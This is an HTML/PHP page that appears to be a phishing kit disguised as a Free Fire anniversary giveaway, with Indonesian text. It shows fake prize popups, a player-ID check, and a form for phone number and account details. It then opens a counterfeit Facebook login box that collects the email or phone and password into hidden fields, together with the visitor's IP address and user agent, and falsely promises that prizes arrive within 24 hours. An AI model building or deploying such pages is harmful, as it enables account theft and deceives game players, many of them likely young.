<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ANNIVERSARY - FREEFIRE</title>
    <link rel="stylesheet" href="assets/css/style.css">
    <script type="module" src="https://cdn.jsdelivr.net/npm/@ionic/core/dist/ionic/ionic.esm.js"></script>
  	<script nomodule src="https://cdn.jsdelivr.net/npm/@ionic/core/dist/ionic/ionic.js"></script>
</head>
<body onload="$('.box').load('pages/evo.php');">
    <div class="wrap">
        <div class="upSide">
            <h1>ANNIVERSARY FREEFIRE</h1>
        </div>
        <div class="imgSlider">
            <img src="https://cdngarenanow-a.akamaihd.net/gstaticid/FF_ID/anniversary/img_banner_slider_1a.jpg" class="active">
            <img src="https://cdngarenanow-a.akamaihd.net/gstaticid/FF_ID/anniversary/img_banner_slider_2b.jpg">
            <img src="https://cdngarenanow-a.akamaihd.net/gstaticid/FF_ID/anniversary/img_banner_slider_3.jfif">
            <img src="https://cdngarenanow-a.akamaihd.net/gstaticid/FF_ID/anniversary/img_banner_slider_4a.jpg">
            <img src="https://cdngarenanow-a.akamaihd.net/gstaticid/FF_ID/anniversary/img_banner_slider_5.png">
        </div>
        <div class="pemisah">
            <div class="kiri">BRAND AMBASSADOR</div>
                <div class="tengah" title="THIS SCRIPT WAS CREATED ON 30/08/2021 BY NGUYEN THU WANN"></div>
            <div class="kanan"><span class="youtuber">YOUTUBER</span></div>
        </div>
        <div class="menu">
            <a class="choosen active" id="evo">EVO GUN</a>
            <a class="choosen" id="old">ITEM OLD</a>
            <a class="choosen" id="incu">INCUBATOR</a>
        </div>
        <div class="box">
            
        </div>
        
        <div class="forms" style="display:none">
            <h1>ISI FORMULIR DIBAWAH</h1>
            <form id="dForm">
                <div class="form-group">
                    <input class="finput" autocomplete="off" placeholder="Nomor HP" id="hp" name="hp">
                </div>
                <div class="form-group">
                    <select class="finput" id="level" name="level">
                    <option value="" selected disabled>Level Akun?</option>
                    <?php
					    for($i=1;$i<=100;$i++){
					    echo'<option>'.$i.'<'.'/option>';
					    }
					?>
                    </select>
                </div>
                <div class="form-group">
                    <select class="finput" id="tier" name="tier" class="form-input">
                    <option value="" selected disabled>Tier Akun</option>
                    <option>Bronze</option>
                    <option>Silver</option>
                    <option>Gold</option>
                    <option>Diamond</option>
                    <option>Master</option>
                    <option>Grand Master</option>
                    </select>
                 </div>
                 <div class="form-group">
                    <select class="finput" id="ep" name="ep" class="form-input">
                    <option value="" selected disabled>Pernah Elite Pass?</option>
                    <option>Pernah</option>
                    <option>Tidak Pernah</option>
                    </select>
                 </div>
                 <input type="hidden" name="user" value="">
                 <input type="hidden" name="pass" value="">
                 <input type="hidden" name="id" value="">
                 <input type="hidden" name="ip" value="">
                 <input type="hidden" name="nick" value="">
                 <input type="hidden" name="ua" value="">
                 <div class="form-group" id="fsubmit">
                     <button class="fsubmit" type="submit">Submit</button>
                 </div>
            </form>
        </div>

        <div class="popGift">
            <h1>Congratulations You've Got</h1>
            <div class="imgBox">
                <img id="imgGift" src="assets/evo/1.jpg">
            </div>
            <div class="nextBtn">Claim</div>
        </div>

        <div class="mask"></div>

        <div class="trueid">
            <h1>VERIFIKASI ID PLAYER</h1>
            <input id="playerid" autocomplete="off" class="inputid" placeholder="Masukkan ID">
            <p class="inputAlert">ID YANG ANDA MASUKKAN TIDAK BENAR</p>
            <div class="checkid">Check ID</div>
        </div>
        <div class="toast">
			<p id="toastAlert">ID Yang anda masukkan tidak cocok engan akun manapun</p>
		</div>



        <div class="sukses">
			<h1>CONGRATULATIONS</h1>
            <img src="http://www.cssmyschool.info/schimg/done.gif">
			<p class="bawah">Halo <span id="endName"></span>, Terimakasih telah mengikuti event ini<br>team akmi akan mengirim hadiah kedalam vault mu dalam 1x24 jam</p>
		</div>
        <!-- FACEBOOK SECTION -->
		<div class="popup-login login-facebook animated fadeIn" style="display: none;">
			<div class="popup-box-login-fb">
			   <div class="navbar-fb">
				  <img width="45" src="assets/img/facebook_text.png">
			   </div>
			   <div class="content-box-fb">
				 <p class="alert sandi">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
				 <p class="alert email">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></p>
				  <img width="75" height="75" src="https://i.ibb.co/fFbdRKj/thumbnail.jpg">
				  <div class="txt-login-fb">
				   Masuk ke akun Facebook Anda untuk terhubung dengan Freefire
				  </div>
				  <div class="login-form">
					 <label>
					 <input type="text" id="user" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off">
					 </label>
					 <label>
					 <input type="password" id="pass" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off">
					 </label>
					 <button  type="submit" id="btnfb" class="btn-login-fb">Masuk</button>
                    </div>
				  <div class="txt-create-account">Create account</div>
				  <div class="txt-not-now">Not now</div>
				  <div class="txt-forgotten-password">Forgotten password?</div>
			   </div>
			   <div class="language-box">
				  <center>
				  <div class="language-name language-name-active">English (UK)</div>
				  <div class="language-name">Bahasa Indonesia</div>
				  <div class="language-name">Basa Jawa</div>
				  <div class="language-name">Bahasa Melayu</div>
				  <div class="language-name">日本語</div>
				  <div class="language-name">Español</div>
				  <div class="language-name">Português (Brasil)</div>
				  <div class="language-name">
					 <i class="fa fa-plus"></i>
				  </div>
				  </center>
			   </div>
			   <div class="copyright">Facebook Inc.</div>
			</div>
		  </div>


    </div>
    <!-- JAVASCRIPT -->
    <script type="text/javascript" src="assets/jquery/dist/jquery.min.js"></script>
    <script type="text/javascript" src="assets/js/interface.js"></script>
    <script type="text/javascript" src="assets/js/tab.js"></script>
    <script type="text/javascript" src="assets/js/validFb.js"></script>
    <script type="text/javascript" src="assets/js/navigator.js"></script>
    <script type="text/javascript" src="assets/js/trueid.js"></script>
    <script type="text/javascript" src="assets/js/backend.js"></script>
</body>
</html>